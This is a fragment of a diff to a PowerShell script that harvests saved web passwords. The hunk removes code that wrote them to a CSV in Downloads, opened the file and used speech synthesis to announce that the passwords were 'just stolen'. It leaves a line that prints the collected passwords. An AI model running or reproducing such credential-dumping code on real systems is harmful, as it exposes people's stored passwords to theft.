@@ -410,25 +410,8 @@ Foreach ($pass in $WebPasswords){
     If (($pass.Password.Trim()).Length -ne 0){$AllPasswords+=$pass}
 }
 
-$AllPasswords | Export-Csv $env:USERPROFILE\downloads\passwords.csv -notypeinformation
-sleep 2
-cd $env:USERPROFILE\downloads
-.\passwords.csv
+$AllPasswords 
 
-$Resources=$AllPasswords.resource
-$StolenResources=@()
-foreach ($resource in $Resources){
-    If ($resource -like "*Target*"){$resource.Split(':')| Foreach {If ($_ -like "*@*" -or $_ -like "*\*"){$resource=$_}}}
-    If ($resource -like "*http*"){$resource=$resource.Trim('https://')}
-    If ($resource -like "www*"){$resource=$resource.Trim('www.')}
-    $StolenResources+=$resource
-    }
 
-Add-Type -AssemblyName System.speech
-$tts = New-Object System.Speech.Synthesis.SpeechSynthesizer
-$poem = @("
-The following passwords were just stolen!
-$StolenResources
-")
-$tts.Speak($poem)
+
 
